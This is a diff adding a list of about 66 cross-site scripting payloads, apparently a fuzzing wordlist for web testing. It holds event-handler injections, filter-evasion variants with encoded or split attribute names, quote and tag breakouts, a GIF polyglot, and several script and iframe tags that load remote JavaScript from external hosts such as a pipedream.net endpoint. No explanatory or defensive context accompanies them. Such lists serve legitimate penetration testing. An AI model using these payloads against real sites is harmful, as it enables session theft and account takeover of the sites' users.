@@ -1,0 +1,66 @@
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus! 
+<x contenteditable onpaste=alert(1)>paste here!
+<script>alert(1)// 
+<script>alert(1)<!–
+<script src=//brutelogic.com.br/1.js> 
+<script src=//3334957647/1>
+%3Cx onxxx=alert(1) 
+<%78 onxxx=1 
+<x %6Fnxxx=1 
+<x o%6Exxx=1 
+<x on%78xx=1 
+<x onxxx%3D1
+<X onxxx=1 
+<x OnXxx=1 
+<X OnXxx=1 
+<x onxxx=1 onxxx=1
+<x/onxxx=1 
+<x%09onxxx=1 
+<x%0Aonxxx=1 
+<x%0Conxxx=1 
+<x%0Donxxx=1 
+<x%2Fonxxx=1 
+<x 1='1'onxxx=1 
+<x 1="1"onxxx=1
+<x </onxxx=1 
+<x 1=">" onxxx=1 
+<http://onxxx%3D1/
+<x onxxx=alert(1) 1='
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1! (MSIE)
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="https://eozjs6m7uhg2805.m.pipedream.net/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="https://eozjs6m7uhg2805.m.pipedream.net/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=https://eozjs6m7uhg2805.m.pipedream.net/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<iframe src=https://eozjs6m7uhg2805.m.pipedream.net/scriptlet.html <
+\";alert('XSS');//
+<u oncopy=alert()> Copy me</u>
+<i onwheel=alert(1)> Scroll over me </i>
+<plaintext>
+https://eozjs6m7uhg2805.m.pipedream.net/%%30%30
+</textarea><script>alert(123)</script>
